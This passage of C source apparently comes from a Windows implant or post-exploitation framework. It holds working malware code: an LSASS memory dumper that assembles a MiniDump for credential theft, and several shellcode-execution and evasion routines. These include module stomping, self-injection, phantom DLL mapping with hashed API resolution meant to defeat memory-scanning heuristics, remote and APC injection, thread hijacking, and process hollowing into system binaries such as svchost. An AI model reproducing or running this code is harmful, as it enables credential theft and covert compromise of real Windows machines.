            } while (Module32Next(snap1, &me));
        }
        CloseHandle(snap1);
    }

    /* enumerate committed memory regions */
    typedef struct { uint64_t addr, sz; uint8_t *buf; } MemReg;
    MemReg *regs = NULL; int n_regs = 0, cap_regs = 0;
    size_t captured_data = 0;
    int capture_stop = 0;
    SIZE_T cur = 0;
    while (1) {
        MEMORY_BASIC_INFORMATION mbi;
        if (!VirtualQueryEx(hProc, (LPCVOID)cur, &mbi, sizeof(mbi))) break;
        if (mbi.State == MEM_COMMIT && lsass_region_is_readable(mbi.Protect)) {
            SIZE_T region_off = 0;
            while (region_off < mbi.RegionSize && captured_data < LSASS_NT_MAX_DUMP_BYTES) {
                SIZE_T remaining = mbi.RegionSize - region_off;
                SIZE_T want = remaining > LSASS_NT_READ_CHUNK ?
                              (SIZE_T)LSASS_NT_READ_CHUNK : remaining;
                size_t budget = LSASS_NT_MAX_DUMP_BYTES - captured_data;
                if ((uint64_t)want > (uint64_t)budget) want = (SIZE_T)budget;
                if (want == 0) break;

                uint8_t *rbuf = (uint8_t*)malloc((size_t)want);
                if (!rbuf) {
                    if (out_partial) *out_partial = 1;
                    capture_stop = 1;
                    break;
                }

                SIZE_T nRead = 0;
                PVOID read_base = (PBYTE)mbi.BaseAddress + region_off;
                (void)ntReadVM(hProc, read_base, rbuf, want, &nRead);
                if (nRead > want) nRead = want; /* defensive against a bad API result */
                if (nRead > 0) {
                    if (n_regs >= (int)LSASS_NT_MAX_REGIONS) {
                        free(rbuf);
                        if (out_partial) *out_partial = 1;
                        capture_stop = 1;
                        break;
                    }
                    if (n_regs >= cap_regs) {
                        int next_cap = cap_regs ? cap_regs * 2 : 256;
                        if ((unsigned)next_cap > LSASS_NT_MAX_REGIONS)
                            next_cap = (int)LSASS_NT_MAX_REGIONS;
                        MemReg *next = (MemReg*)realloc(regs, (size_t)next_cap * sizeof(MemReg));
                        if (!next) {
                            free(rbuf);
                            if (out_partial) *out_partial = 1;
                            capture_stop = 1;
                            break;
                        }
                        regs = next;
                        cap_regs = next_cap;
                    }
                    regs[n_regs].addr = (uint64_t)(uintptr_t)read_base;
                    regs[n_regs].sz   = nRead;
                    regs[n_regs].buf  = rbuf;
                    n_regs++;
                    captured_data += (size_t)nRead;
                } else {
                    free(rbuf);
                }

                /* Advance by the requested chunk, not nRead. A partial or
                 * failed read must not cause the same memory to be retried. */
                region_off += want;
            }
            if (captured_data >= LSASS_NT_MAX_DUMP_BYTES && out_partial)
                *out_partial = 1;
        }
        if (capture_stop) break;
        SIZE_T next = (SIZE_T)mbi.BaseAddress + mbi.RegionSize;
        if (next <= cur) break;
        cur = next;
        if (captured_data >= LSASS_NT_MAX_DUMP_BYTES) break;
    }
    CloseHandle(hProc);
    if (captured_data == 0) {
        free(mods);
        free(regs);
        return NULL;
    }

    /* build MDMP */
    #define MOD_ENT_SZ 108
    #define SYS_INFO_SZ 62  /* 56 struct + 6 bytes empty MINIDUMP_STRING for CSDVersionRva */
    int dir_off     = 32;
    int sys_info_off= dir_off + 3*12;           /* 68 */
    int mod_list_off= sys_info_off + SYS_INFO_SZ; /* 130 */

    /* build module name blobs (MINIDUMP_STRING = ULONG32 len + UTF-16 + null) */
    typedef struct { int rva; uint8_t *blob; int blob_len; } NameBlob;
    NameBlob *names = (NameBlob*)calloc(n_mods, sizeof(NameBlob));
    uint8_t *buf = NULL;
    if (n_mods > 0 && !names) goto done;
    int name_off = mod_list_off + 4 + n_mods * MOD_ENT_SZ;
    for (int i = 0; i < n_mods; i++) {
        int namelen = (int)strlen(mods[i].name);
        int blen = 4 + (namelen + 1) * 2; /* ULONG32 + UTF-16 chars + null */
        uint8_t *blob = (uint8_t*)calloc(1, blen);
        if (!blob) goto done;
        uint32_t cb = (uint32_t)(namelen * 2); /* byte count excl null */
        memcpy(blob, &cb, 4);
        for (int j = 0; j < namelen; j++) { blob[4 + j*2] = (uint8_t)mods[i].name[j]; blob[4+j*2+1] = 0; }
        names[i].rva = name_off; names[i].blob = blob; names[i].blob_len = blen;
        name_off += blen;
    }

    int mem64_off    = name_off;
    int mem64_hdr_len= 8 + 8 + n_regs * 16;
    int data_off     = mem64_off + mem64_hdr_len;
    size_t total_len = (size_t)data_off + captured_data;

    buf = (uint8_t*)calloc(1, total_len);
    if (!buf) goto done;

    #define WU32(off,v) do { uint32_t _v=(uint32_t)(v); memcpy(buf+(off),&_v,4); } while(0)
    #define WU64(off,v) do { uint64_t _v=(uint64_t)(v); memcpy(buf+(off),&_v,8); } while(0)
    #define WU16(off,v) do { uint16_t _v=(uint16_t)(v); memcpy(buf+(off),&_v,2); } while(0)

    /* MINIDUMP_HEADER */
    WU32(0,  0x504d444dU);
    WU32(4,  0x0000a793U);
    WU32(8,  3);          /* NumberOfStreams */
    WU32(12, dir_off);
    WU32(20, (uint32_t)time(NULL));
    WU64(24, 2);          /* Flags = MiniDumpWithFullMemory */

    /* directories */
    WU32(dir_off,     7); WU32(dir_off+4,  SYS_INFO_SZ);               WU32(dir_off+8,  sys_info_off);
    WU32(dir_off+12,  4); WU32(dir_off+16, mem64_off - mod_list_off);   WU32(dir_off+20, mod_list_off);
    WU32(dir_off+24,  9); WU32(dir_off+28, mem64_hdr_len);              WU32(dir_off+32, mem64_off);

    /* SystemInfo at sys_info_off */
    WU16(sys_info_off,    9);     /* PROCESSOR_ARCHITECTURE_AMD64 */
    WU16(sys_info_off+2,  6);     /* ProcessorLevel */
    buf[sys_info_off+6] = 1;      /* NumberOfProcessors */
    buf[sys_info_off+7] = 1;      /* ProductType */
    WU32(sys_info_off+8,  os_major); /* MajorVersion */
    WU32(sys_info_off+12, os_minor); /* MinorVersion */
    WU32(sys_info_off+16, os_build); /* BuildNumber */
    WU32(sys_info_off+20, 2);     /* PlatformId */
    /* CSDVersionRva → 6-byte empty MINIDUMP_STRING appended after the 56-byte struct
     * (Length=0, null wchar = 00 00 00 00 00 00, already zeroed by calloc) */
    WU32(sys_info_off+24, sys_info_off+56);

    /* ModuleList */
    WU32(mod_list_off, n_mods);
    for (int i = 0; i < n_mods; i++) {
        int e = mod_list_off + 4 + i * MOD_ENT_SZ;
        WU64(e,    mods[i].base);
        WU32(e+8,  mods[i].sz);
        WU32(e+20, names[i].rva);
    }
    for (int i = 0; i < n_mods; i++) {
        memcpy(buf + names[i].rva, names[i].blob, names[i].blob_len);
    }

    /* Memory64List */
    WU64(mem64_off,   n_regs);
    WU64(mem64_off+8, data_off);
    for (int i = 0; i < n_regs; i++) {
        int e = mem64_off + 16 + i * 16;
        WU64(e,   regs[i].addr);
        WU64(e+8, regs[i].sz);
    }

    /* raw data */
    { size_t pos = data_off;
      for (int i = 0; i < n_regs; i++) { memcpy(buf+pos, regs[i].buf, regs[i].sz); pos += regs[i].sz; } }

    *out_len = total_len;

done:
    if (names) for (int i = 0; i < n_mods; i++) free(names[i].blob);
    free(names); free(mods);
    for (int i = 0; i < n_regs; i++) free(regs[i].buf);
    free(regs);
    return buf;
    #undef MOD_ENT_SZ
    #undef SYS_INFO_SZ
    #undef WU32
    #undef WU64
    #undef WU16
}

#undef LSASS_NT_MAX_DUMP_BYTES
#undef LSASS_NT_READ_CHUNK
#undef LSASS_NT_MAX_REGIONS

// ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────

static char *shellcode_stomp(const uint8_t *sc, size_t sc_len, const char *dll_hint) {
    static const char *auto_targets[] = {
        "xpsservices.dll","clbcatq.dll","msasn1.dll","wbemprox.dll","wbemcomn.dll", NULL
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
    if (snap == INVALID_HANDLE_VALUE) return _strdup("[-] shellcode_stomp: snapshot failed");

    MODULEENTRY32 me; me.dwSize = sizeof(me);
    LPVOID target_base = NULL; char target_name[64] = "";
    if (Module32First(snap, &me)) {
        do {
            char low[MAX_MODULE_NAME32+2]; strncpy(low, me.szModule, sizeof(low)-1); CharLowerA(low);
            int pick = 0;
            if (dll_hint && dll_hint[0]) {
                char hint_low[MAX_MODULE_NAME32+2]; strncpy(hint_low, dll_hint, sizeof(hint_low)-1); CharLowerA(hint_low);
                pick = (strcmp(low, hint_low) == 0);
            } else {
                for (int i = 0; auto_targets[i]; i++) if (strcmp(low, auto_targets[i]) == 0) { pick=1; break; }
            }
            if (pick) { target_base = me.modBaseAddr; strncpy(target_name, me.szModule, sizeof(target_name)-1); break; }
        } while (Module32Next(snap, &me));
    }
    CloseHandle(snap);
    if (!target_base) return _strdup("[-] shellcode_stomp: target DLL not loaded");

    /* Parse PE to locate .text section */
    BYTE *base = (BYTE*)target_base;
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    BYTE *nt = base + e_lfanew;
    WORD  num_secs  = *(WORD*)(nt + 6);
    WORD  opt_sz    = *(WORD*)(nt + 20);
    BYTE *sec       = nt + 24 + opt_sz;
    DWORD text_rva = 0, text_sz = 0;
    for (WORD i = 0; i < num_secs; i++, sec += 40) {
        if (memcmp(sec, ".text", 5) == 0) {
            text_sz  = *(DWORD*)(sec + 16);
            text_rva = *(DWORD*)(sec + 12);
            break;
        }
    }
    if (!text_sz) { char *e=(char*)malloc(128); snprintf(e,128,"[-] shellcode_stomp: no .text in %s",target_name); return e; }

    BYTE *write_addr = base + text_rva;
    SIZE_T write_len = sc_len < text_sz ? sc_len : (SIZE_T)text_sz;
    DWORD old; VirtualProtect(write_addr, write_len, PAGE_READWRITE, &old);
    memcpy(write_addr, sc, write_len);
    VirtualProtect(write_addr, write_len, PAGE_EXECUTE_READ, &old);

    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)write_addr, NULL, 0, NULL);
    if (!ht) { char *e=(char*)malloc(128); snprintf(e,128,"[-] shellcode_stomp: CreateThread failed %lu",GetLastError()); return e; }
    CloseHandle(ht);
    char *out = (char*)malloc(256);
    snprintf(out, 256, "[+] shellcode_stomp: %s+0x%lX sc=%zu B \xe2\x86\x92 executing", target_name, (unsigned long)text_rva, sc_len);
    return out;
}

// ── In-process shellcode execution (STAGE2) ──────────────────────────────────

static char *inject_self(const uint8_t *sc, size_t sc_len) {
    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { char *e=(char*)malloc(64); snprintf(e,64,"[-] VirtualAlloc failed %lu",GetLastError()); return e; }
    memcpy(mem, sc, sc_len);
    DWORD old;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);
    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!ht) { VirtualFree(mem, 0, MEM_RELEASE); char *e=(char*)malloc(64); snprintf(e,64,"[-] CreateThread failed %lu",GetLastError()); return e; }
    CloseHandle(ht);
    char *out = (char*)malloc(128);
    snprintf(out, 128, "[+] self-inject: %zu bytes \xe2\x86\x92 executing", sc_len);
    return out;
}

// ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────
//
// Maps shellcode into a SEC_IMAGE-backed section (CoW).  From the VAD the pages
// appear owned by a legitimate DLL on disk — defeats "unlinked memory" heuristics.

typedef NTSTATUS (NTAPI *NtCreateSection_f)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *NtMapViewOfSection_f)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_f)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_f)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_f)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

typedef struct { USHORT Length, MaximumLength; PWSTR Buffer; } PL_UNICODE_STRING;
typedef struct { ULONG Length; HANDLE Root; PL_UNICODE_STRING *Name; ULONG Attribs; PVOID SecDesc, SecQoS; } PL_OBJECT_ATTRIBUTES;
typedef struct { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Info; } PL_IO_STATUS_BLOCK;

/* NtOpenFile is exported from ntdll so GetProcAddress works */
typedef NTSTATUS (NTAPI *NtOpenFile_f)(PHANDLE, ACCESS_MASK, PL_OBJECT_ATTRIBUTES*, PL_IO_STATUS_BLOCK*, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtClose_f)(HANDLE);

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x40UL
#endif
#define PL_SECTION_ALL_ACCESS 0x000F001FL
#define PL_SEC_IMAGE          0x01000000UL
#define PL_VIEW_SHARE         1UL
#define PL_FILE_SYNC_IO       0x00000020UL
#define PL_FILE_NON_DIR       0x00000040UL

static char *phantom_load(const uint8_t *sc, size_t sc_len) {
    /* Find host DLL */
    char sysroot[MAX_PATH]; ExpandEnvironmentStringsA("%SystemRoot%", sysroot, MAX_PATH);
    static const char *candidates[] = {
        "\\System32\\xpsservices.dll",
        "\\System32\\clbcatq.dll",
        "\\System32\\msasn1.dll",
        NULL
    };
    char hostPath[MAX_PATH] = "";
    for (int i = 0; candidates[i]; i++) {
        snprintf(hostPath, MAX_PATH, "%s%s", sysroot, candidates[i]);
        if (GetFileAttributesA(hostPath) != INVALID_FILE_ATTRIBUTES) break;
        hostPath[0] = '\0';
    }
    if (!hostPath[0]) return _strdup("[-] phantom_load: no host DLL found");

    /* Resolve ntdll functions via hash — no plaintext NT strings */
    NtOpenFile_f             pfnOpen   = (NtOpenFile_f)            resolve_fn(H_NT_NtOpenFile);
    NtClose_f                pfnClose  = (NtClose_f)               resolve_fn(H_NT_NtClose);
    NtCreateSection_f        pfnCS     = (NtCreateSection_f)       resolve_fn(H_NT_NtCreateSection);
    NtMapViewOfSection_f     pfnMap    = (NtMapViewOfSection_f)    resolve_fn(H_NT_NtMapViewOfSection);
    NtUnmapViewOfSection_f   pfnUnmap  = (NtUnmapViewOfSection_f)  resolve_fn(H_NT_NtUnmapViewOfSection);
    NtProtectVirtualMemory_f pfnProt   = (NtProtectVirtualMemory_f)resolve_fn(H_NT_NtProtectVirtualMemory);
    NtCreateThreadEx_f       pfnThread = (NtCreateThreadEx_f)      resolve_fn(H_NT_NtCreateThreadEx);
    if (!pfnOpen || !pfnCS || !pfnMap || !pfnProt) return _strdup("[-] phantom_load: resolve failed");

    /* NtOpenFile — NT namespace path \??\<drive:\path> */
    char ntPathA[MAX_PATH + 8]; snprintf(ntPathA, sizeof(ntPathA), "\\??\\%s", hostPath);
    int wlen = MultiByteToWideChar(CP_UTF8, 0, ntPathA, -1, NULL, 0);
    WCHAR *wpath = (WCHAR*)malloc(wlen * 2);
    if (!wpath) return _strdup("[-] phantom_load: alloc failed");
    MultiByteToWideChar(CP_UTF8, 0, ntPathA, -1, wpath, wlen);
    int nbytes = (wlen - 1) * 2;
    PL_UNICODE_STRING ustr = { (USHORT)nbytes, (USHORT)(nbytes + 2), wpath };
    PL_OBJECT_ATTRIBUTES oa = { sizeof(PL_OBJECT_ATTRIBUTES), NULL, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL };
    PL_IO_STATUS_BLOCK isb = {0};
    HANDLE fileH = NULL;
    NTSTATUS st = pfnOpen(&fileH, GENERIC_READ | FILE_EXECUTE | SYNCHRONIZE, &oa, &isb,
                          FILE_SHARE_READ | FILE_SHARE_DELETE, PL_FILE_SYNC_IO | PL_FILE_NON_DIR);
    free(wpath);
    if (st != 0 || !fileH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] open: 0x%08lX",(unsigned long)st); return e; }

    /* NtCreateSection SEC_IMAGE */
    HANDLE secH = NULL;
    NTSTATUS st2 = pfnCS(&secH, PL_SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, PL_SEC_IMAGE, fileH);
    pfnClose(fileH);
    if (st2 != 0 || !secH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] creat: 0x%08lX",(unsigned long)st2); return e; }

    /* NtMapViewOfSection — CoW */
    PVOID mappedBase = NULL; SIZE_T viewSize = 0;
    NTSTATUS st3 = pfnMap(secH, GetCurrentProcess(), &mappedBase, 0, 0, NULL, &viewSize,
                          PL_VIEW_SHARE, 0, PAGE_EXECUTE_WRITECOPY);
    if (st3 != 0) {
        mappedBase = NULL; viewSize = 0;
        st3 = pfnMap(secH, GetCurrentProcess(), &mappedBase, 0, 0, NULL, &viewSize,
                     PL_VIEW_SHARE, 0, PAGE_EXECUTE_READ);
        if (st3 != 0) { pfnClose(secH); char *e=(char*)malloc(64); snprintf(e,64,"[-] map: 0x%08lX",(unsigned long)st3); return e; }
    }
    pfnClose(secH);

    SIZE_T writeSize = sc_len < viewSize ? sc_len : viewSize;

    /* RW → CoW triggers → private pages */
    ULONG oldProt = 0;
    PVOID base2 = mappedBase; SIZE_T ws2 = writeSize;
    pfnProt(GetCurrentProcess(), &base2, &ws2, PAGE_READWRITE, &oldProt);
    memcpy(mappedBase, sc, writeSize);

    /* RX — never RWX */
    base2 = mappedBase; ws2 = writeSize;
    pfnProt(GetCurrentProcess(), &base2, &ws2, PAGE_EXECUTE_READ, &oldProt);

    /* Execute */
    if (pfnThread) {
        HANDLE hThr = NULL;
        pfnThread(&hThr, 0x1FFFFF, NULL, GetCurrentProcess(), mappedBase, NULL, 0, 0, 0, 0, NULL);
        if (hThr) CloseHandle(hThr);
    } else {
        HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mappedBase, NULL, 0, NULL);
        if (hThr) CloseHandle(hThr);
    }

    char *out = (char*)malloc(256);
    snprintf(out, 256, "[+] phantomLoad: host=%s mapped=0x%p sc=%zu B \xe2\x86\x92 executing", hostPath, mappedBase, sc_len);
    return out;
}

// ── Process injection ─────────────────────────────────────────────────────────

static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
    DWORD tid = 0;
    HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    if (!ht) { DWORD err=GetLastError(); VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"CreateRemoteThread failed %lu",err); return e; }
    CloseHandle(ht); CloseHandle(hProc);
    char *out = (char*)malloc(128);
    snprintf(out, 128, "[+] injected %zu bytes into PID %d (TID=%lu)", sc_len, pid, (unsigned long)tid);
    return out;
}

static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    DWORD old_prot; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old_prot);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); return strdup("snapshot failed"); }
    THREADENTRY32 te; te.dwSize = sizeof(te);
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if ((int)te.th32OwnerProcessID == pid) {
                HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (ht) { QueueUserAPC((PAPCFUNC)mem, ht, 0); CloseHandle(ht); queued++; }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(hProc);
    char *out = (char*)malloc(64);
    snprintf(out, 64, "[+] APC queued to %d thread(s) in PID %d", queued, pid);
    return out;
}

// ── Thread hijack injection ───────────────────────────────────────────────────

static char *thread_hijack(DWORD pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed (err %lu)",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); return strdup("Toolhelp snapshot failed"); }
    THREADENTRY32 te; te.dwSize = sizeof(te);
    DWORD targetTID = 0;
    if (Thread32First(snap, &te)) {
        do { if (te.th32OwnerProcessID == pid) { targetTID = te.th32ThreadID; break; } }
        while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    if (!targetTID) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"no thread in PID %lu",pid); return e; }
    HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTID);
    if (!ht) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"OpenThread failed (err %lu)",GetLastError()); return e; }
    SuspendThread(ht);
    CONTEXT ctx; memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(ht, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(ht, &ctx); }
    ResumeThread(ht); CloseHandle(ht); CloseHandle(hProc);
    char *out = (char*)malloc(128);
    snprintf(out, 128, "[+] thread %lu hijacked in PID %lu (%zu B)", (unsigned long)targetTID, (unsigned long)pid, sc_len);
    return out;
}

// ── Process hollow ────────────────────────────────────────────────────────────

static char *do_hollow(const char *target, const uint8_t *pe, size_t pe_len) {
    if (pe_len < 0x40) return strdup("[error: payload too small]");
    if (pe[0] != 0x4D || pe[1] != 0x5A) {
        char tgt[MAX_PATH] = {0};
        if (target && target[0]) {
            strncpy(tgt, target, MAX_PATH-1);
        } else {
            char sys[MAX_PATH]; GetSystemDirectoryA(sys, MAX_PATH);
            snprintf(tgt, MAX_PATH, "%s\\RuntimeBroker.exe", sys);
            if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
                snprintf(tgt, MAX_PATH, "%s\\dllhost.exe", sys);
            if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
                snprintf(tgt, MAX_PATH, "%s\\svchost.exe", sys);
        }
        WCHAR tgt_w[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, tgt, -1, tgt_w, MAX_PATH);
        STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
        if (!CreateProcessW(NULL, tgt_w, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            char *e=(char*)malloc(128); snprintf(e,128,"CreateProcessW(%s) failed (err %lu)",tgt,GetLastError()); return e;
        }
        LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, pe_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!mem) { TerminateProcess(pi.hProcess,1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return strdup("VirtualAllocEx failed"); }
        SIZE_T wr;
        WriteProcessMemory(pi.hProcess, mem, pe, pe_len, &wr);
        DWORD old; VirtualProtectEx(pi.hProcess, mem, pe_len, PAGE_EXECUTE_READ, &old);
        CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
        if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(pi.hThread, &ctx); }
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        char *out = (char*)malloc(192);
        snprintf(out, 192, "[+] hollow: %s PID=%lu sc=0x%llx (%zu B)", tgt, (unsigned long)pi.dwProcessId, (unsigned long long)(DWORD64)mem, pe_len);
        return out;
    }
    DWORD pe_off; memcpy(&pe_off, pe + 0x3C, 4);
    if (pe_off + sizeof(IMAGE_NT_HEADERS64) > pe_len) return strdup("[error: e_lfanew OOB]");
    const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64 *)(pe + pe_off);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return strdup("[error: not a PE]");
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return strdup("[error: not AMD64]");
    DWORD entry_rva     = nt->OptionalHeader.AddressOfEntryPoint;
    DWORD64 pref_base   = nt->OptionalHeader.ImageBase;
    DWORD size_of_image = nt->OptionalHeader.SizeOfImage;
    DWORD size_of_hdrs  = nt->OptionalHeader.SizeOfHeaders;
    WORD  num_sec       = nt->FileHeader.NumberOfSections;
    WORD  opt_sz        = nt->FileHeader.SizeOfOptionalHeader;
    char tgt[MAX_PATH] = {0};
    if (target && target[0]) {
        strncpy(tgt, target, MAX_PATH-1);
    } else {
        char sys[MAX_PATH]; GetSystemDirectoryA(sys, MAX_PATH);
        snprintf(tgt, MAX_PATH, "%s\\RuntimeBroker.exe", sys);
        if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
            snprintf(tgt, MAX_PATH, "%s\\dllhost.exe", sys);
        if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
            snprintf(tgt, MAX_PATH, "%s\\svchost.exe", sys);
    }
    WCHAR tgt_w[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, tgt, -1, tgt_w, MAX_PATH);
    STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, tgt_w, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        char *e=(char*)malloc(128); snprintf(e,128,"CreateProcessW(%s) failed (err %lu)",tgt,GetLastError()); return e;
    }
    LPVOID base = VirtualAllocEx(pi.hProcess, (LPVOID)pref_base, size_of_image,
                                  MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) base = VirtualAllocEx(pi.hProcess, NULL, size_of_image,
                                      MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) { TerminateProcess(pi.hProcess,1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return strdup("VirtualAllocEx failed"); }
    SIZE_T wr;
    DWORD hdr_sz = (size_of_hdrs < (DWORD)pe_len) ? size_of_hdrs : (DWORD)pe_len;
    WriteProcessMemory(pi.hProcess, base, pe, hdr_sz, &wr);
    const IMAGE_SECTION_HEADER *secs = (const IMAGE_SECTION_HEADER *)(pe + pe_off + 4 + sizeof(IMAGE_FILE_HEADER) + opt_sz);
    for (int i = 0; i < num_sec; i++) {
        DWORD virt_rva = secs[i].VirtualAddress;
        DWORD raw_size = secs[i].SizeOfRawData;
        DWORD raw_off  = secs[i].PointerToRawData;
        if (!raw_size || !raw_off || raw_off + raw_size > (DWORD)pe_len) continue;
        WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD64)base + virt_rva), pe + raw_off, raw_size, &wr);
    }
    DWORD64 ep = (DWORD64)base + entry_rva;
    CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = ep; SetThreadContext(pi.hThread, &ctx); }
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    char *out = (char*)malloc(256);
    snprintf(out, 256, "[+] hollow: %s PID=%lu base=0x%llx entry=0x%llx",
             tgt, (unsigned long)pi.dwProcessId, (unsigned long long)(DWORD64)base, (unsigned long long)ep);
    return out;
}

// ── Fork-and-run (shellcode in sacrificial process) ───────────────────────────

static char *fork_run(const char *cmd, const uint8_t *sc, size_t sc_len) {
    char proc_path[MAX_PATH] = {0};
    if (cmd && cmd[0]) {
        strncpy(proc_path, cmd, MAX_PATH-1);
    } else {
        char sys[MAX_PATH]; GetSystemDirectoryA(sys, MAX_PATH);
        snprintf(proc_path, MAX_PATH, "%s\\RuntimeBroker.exe", sys);
        if (GetFileAttributesA(proc_path) == INVALID_FILE_ATTRIBUTES)
            snprintf(proc_path, MAX_PATH, "%s\\dllhost.exe", sys);
